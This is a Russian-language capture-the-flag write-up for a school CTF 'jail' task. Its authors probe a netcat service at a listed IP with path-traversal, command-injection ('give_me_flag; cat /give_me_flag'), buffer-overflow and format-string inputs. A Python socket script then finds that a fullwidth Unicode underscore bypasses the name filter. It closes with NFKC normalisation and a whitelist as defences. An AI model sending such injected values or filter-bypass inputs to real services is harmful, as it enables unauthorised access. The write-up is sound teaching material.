Дали доступ к подключению. Есть функция give_me_flag. Не работает. Говорит закрыто. Помогите, товарищ. Нужны данные.

`nc 158.160.205.186 13375`
___
При подключении нас просят ввести название функции, очевидно ввод `give_me_flag` дает ответ что функция недоступна. После тестирования разных входных данных, например `give_flag`, сервер отвечает `Bad name`. Так мы можем понять что ввод пользователя валидируется и теперь нам нужно найти уязвимость чтобы обойти эту валидацию. 

Дальше мы можем использовать разные уязвимости, такие как path traversal `../give_me_flag`; command injection `give_me_flag; cat /give_me_flag`; buffer overflow `python -c "print('A' * 1000)" | nc 158.160.205.186 13375`; формантные строки `%x`.

Однако результатов это не дало, и мы дальше экспериментировали с вводом данных и смотрели как реагирует сервер. Через некоторое количество попыток мы обнаружили новый ответ:

![[Райтапы/SchoolCTF/PWN ((horny) JAIL)/Вложенные файлы/A/image1.png]]

Это подтолкнуло к мысли, что если имя «_» зарезервировано, то что будет если изменить его кодировку? Как сервер отреагирует на такой ввод? Мы посмотрели различные варианты как это можно сделать и написали скрипт для того чтобы отправить запрос в нужной кодировке.

```python
import socket
import base64

host = "158.160.205.186"
port = 13375

code = [
    "give%5Fme%5Fflag",
    base64.b64encode(b"give_me_flag").decode(),
    "676976655F6D655F666C6167",
    "give\x5Fme\x5Fflag",  
    "give＿me＿flag",  
    "giveˍmeˍflag",
    "giveU+FF3FmeU+FF3Fflag" 
]

for val in code:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        s.recv(1024)
        s.send((val + "\n").encode())
        response = s.recv(1024).decode()
        s.close()
        print(f"'{val}': {response.strip()}")
```

Кодировка которая подошла: give＿me＿flag (Unicode)

![[Райтапы/SchoolCTF/PWN ((horny) JAIL)/Вложенные файлы/A/image2.png]]

Мы получили флаг.
## `ctfschool{n0rmalizing_str1ngs_t0_avo1d_cl0s3d_0pp0rtun1t13s}`





Санитизация входных данных (Защита):

```
import unicodedata

def normalize_input(input_user):

    # Нормализуем в форму NFKC 
    normalized = unicodedata.normalize('NFKC', input_user)
    return normalized

user_input = "give＿me＿flag"  
normalized = normalize_input(user_input)
print(normalized)  # "give_me_flag" - обычное подчеркивание
```

Либо через белый список ( id ):

```
dict = {‘give_me_flag’: id} 
if user_input not in dict :
Print(“Bad name”)
```